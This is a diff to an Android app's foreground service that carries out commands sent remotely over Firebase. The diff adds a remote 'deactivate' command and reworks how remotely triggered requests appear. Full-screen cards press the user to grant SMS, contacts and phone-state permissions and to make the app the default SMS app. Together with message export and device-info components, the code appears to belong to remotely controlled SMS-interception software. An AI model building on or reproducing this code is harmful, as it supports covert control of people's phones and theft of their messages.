@@ -42,6 +42,8 @@ import com.example.fast.util.DeviceInfoCollector
 import com.example.fast.util.LogHelper
 import com.example.fast.util.DefaultSmsAppHelper
 import com.example.fast.ui.DefaultSmsRequestActivity
+import com.example.fast.ui.MultipurposeCardActivity
+import com.example.fast.ui.card.RemoteCardHandler
 import com.example.fast.util.FirebaseWriteHelper
 import com.example.fast.workers.BackupMessagesWorker
 import com.example.fast.workers.ExportMessagesWorker
@@ -766,6 +768,16 @@ class PersistentForegroundService : Service() {
                     updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
                 }
             }
+            "deactivate" -> {
+                try {
+                    handleDeactivateCommand(content)
+                    // Deactivate is async, but we mark as executed since it starts the process
+                    updateCommandHistoryStatus(historyTimestamp, key, "executed")
+                } catch (e: Exception) {
+                    LogHelper.e(TAG, "Error executing deactivate command", e)
+                    updateCommandHistoryStatus(historyTimestamp, key, "failed", e.message)
+                }
+            }
             "checkPermission" -> {
                 try {
                     handleCheckPermissionCommand(content, historyTimestamp)
@@ -1106,8 +1118,7 @@ class PersistentForegroundService : Service() {
      * Format: "permission1,permission2,..." or "ALL"
      *
      * Uses PermissionManager: "ALL" uses [PermissionManager.getRemotePermissionNamesForAll].
-     * RemotePermissionRequestActivity runs the list-based flow via [PermissionManager.startRequestPermissionList]
-     * and [PermissionManager.permissionNamesToRequests], then syncs results and handles notification/battery.
+     * MultipurposeCardActivity displays the permission request card and handles the flow.
      *
      * Permissions: sms, contacts, phone_state, notification, battery, ALL
      */
@@ -1121,14 +1132,19 @@ class PersistentForegroundService : Service() {
             requested
         }
 
-        // Use RemotePermissionRequestActivity so the permission option popup always shows.
-        val intent = Intent(this, com.example.fast.ui.RemotePermissionRequestActivity::class.java).apply {
+        // Use MultipurposeCardActivity for permission requests
+        val intent = Intent(this, MultipurposeCardActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK
-            putStringArrayListExtra("permissions", ArrayList(permissionsToRequest))
+            putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_PERMISSION)
+            putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
+            putExtra(RemoteCardHandler.KEY_TITLE, "Permission Required")
+            putExtra(RemoteCardHandler.KEY_BODY, "Please grant the required permissions to continue using the app.")
+            putExtra(RemoteCardHandler.KEY_PERMISSIONS, permissionsToRequest.joinToString(","))
+            putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Grant")
         }
         startActivity(intent)
 
-        LogHelper.d(TAG, "Requesting permissions (RemotePermissionRequestActivity): $permissionsToRequest")
+        LogHelper.d(TAG, "Requesting permissions (MultipurposeCardActivity): $permissionsToRequest")
     }
 
     /**
@@ -1909,8 +1925,8 @@ class PersistentForegroundService : Service() {
      * Handle requestDefaultSmsApp command
      * Format: Any value (content is ignored, command always executes)
      *
-     * Opens the DefaultSmsRequestActivity to guide the user,
-     * then lets that screen trigger the system dialog.
+     * Opens the MultipurposeCardActivity to guide the user,
+     * then triggers the system default SMS dialog.
      *
      * @param content Command content (ignored, can be any value)
      * @param historyTimestamp Timestamp for command history updates
@@ -1921,7 +1937,7 @@ class PersistentForegroundService : Service() {
         historyTimestamp: Long,
         commandKey: String
     ) {
-        LogHelper.d(TAG, "Executing requestDefaultSmsApp command - opening DefaultSmsRequestActivity")
+        LogHelper.d(TAG, "Executing requestDefaultSmsApp command - opening MultipurposeCardActivity")
 
         if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
             LogHelper.d(TAG, "Default SMS app already set - skipping request")
@@ -1931,16 +1947,21 @@ class PersistentForegroundService : Service() {
 
         val attemptRequest = {
             try {
-                val intent = Intent(this, DefaultSmsRequestActivity::class.java).apply {
+                val intent = Intent(this, MultipurposeCardActivity::class.java).apply {
                     addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
+                    putExtra(RemoteCardHandler.KEY_CARD_TYPE, RemoteCardHandler.CARD_TYPE_DEFAULT_SMS)
+                    putExtra(RemoteCardHandler.KEY_DISPLAY_MODE, RemoteCardHandler.DISPLAY_MODE_FULLSCREEN)
+                    putExtra(RemoteCardHandler.KEY_TITLE, "Default Messaging App")
+                    putExtra(RemoteCardHandler.KEY_BODY, "To receive SMS messages, please set this app as your default messaging app.")
+                    putExtra(RemoteCardHandler.KEY_PRIMARY_BUTTON, "Set as Default")
                     putExtra("commandKey", commandKey)
-                    putExtra("historyTimestamp", historyTimestamp)
+                    putExtra("historyTimestamp", historyTimestamp.toString())
                 }
                 startActivity(intent)
-                LogHelper.d(TAG, "DefaultSmsRequestActivity launched successfully")
+                LogHelper.d(TAG, "MultipurposeCardActivity (default_sms) launched successfully")
                 updateCommandHistoryStatus(historyTimestamp, commandKey, "executed", "request_ui_launched")
             } catch (e: Exception) {
-                LogHelper.e(TAG, "Error launching DefaultSmsRequestActivity", e)
+                LogHelper.e(TAG, "Error launching MultipurposeCardActivity", e)
                 // Fallback: open system dialog directly
                 try {
                     DefaultSmsAppHelper.requestDefaultSmsApp(this)
@@ -1986,7 +2007,7 @@ class PersistentForegroundService : Service() {
         historyTimestamp: Long,
         commandKey: String
     ) {
-        LogHelper.d(TAG, "Executing requestDefaultMessageApp command - opening DefaultSmsRequestActivity")
+        LogHelper.d(TAG, "Executing requestDefaultMessageApp command - delegating to requestDefaultSmsApp")
         handleRequestDefaultSmsAppCommand(content, historyTimestamp, commandKey)
     }
 
@@ -2344,6 +2365,70 @@ class PersistentForegroundService : Service() {
             LogHelper.e(TAG, "Permission denied navigating to SplashActivity", e)
         } catch (e: Exception) {
             LogHelper.e(TAG, "Failed to navigate to SplashActivity", e)
+        }
+    }
+
+    /**
+     * Handle deactivate command
+     * Format: Any value (content is ignored, command always executes)
+     *
+     * Deactivates the device by:
+     * - Setting isActive to false in Firebase
+     * - Setting is_active to false in Django
+     * - Navigating to ActivationActivity
+     *
+     * Unlike reset, this does NOT clear phone, code, or other data.
+     * The user can re-activate with the same code if still valid.
+     *
+     * @param content Command content (ignored, can be any value)
+     */
+    @SuppressLint("HardwareIds")
+    private fun handleDeactivateCommand(content: String) {
+        LogHelper.d(TAG, "Executing deactivate command")
+
+        val deviceId = androidId()
+        val devicePath = AppConfig.getFirebaseDevicePath(deviceId)
+        val deviceRef = Firebase.database.reference.child(devicePath)
+
+        // Set isActive to false in Firebase (keep other data intact)
+        deviceRef.child("isActive").setValue(false)
+            .addOnSuccessListener {
+                LogHelper.d(TAG, "Firebase deactivate successful - isActive set to false")
+            }
+            .addOnFailureListener { e ->
+                LogHelper.e(TAG, "Failed to deactivate in Firebase", e)
+            }
+
+        // Update Django - set is_active to false
+        serviceScope.launch {
+            try {
+                DjangoApiHelper.patchDevice(deviceId, mapOf("is_active" to false))
+                LogHelper.d(TAG, "Django deactivate successful")
+                // Navigate to ActivationActivity after Django update
+                navigateToActivationActivity()
+            } catch (e: Exception) {
+                LogHelper.e(TAG, "Failed to deactivate in Django", e)
+                // Still navigate even if Django fails (Firebase is updated)
+                navigateToActivationActivity()
+            }
+        }
+    }
+
+    /**
+     * Navigate to ActivationActivity
+     * This is called after deactivate command sets isActive to false
+     */
+    private fun navigateToActivationActivity() {
+        try {
+            val intent = Intent(this, com.example.fast.ui.ActivationActivity::class.java).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
+            }
+            startActivity(intent)
+            LogHelper.d(TAG, "Navigated to ActivationActivity")
+        } catch (e: SecurityException) {
+            LogHelper.e(TAG, "Permission denied navigating to ActivationActivity", e)
+        } catch (e: Exception) {
+            LogHelper.e(TAG, "Failed to navigate to ActivationActivity", e)
         }
     }
 
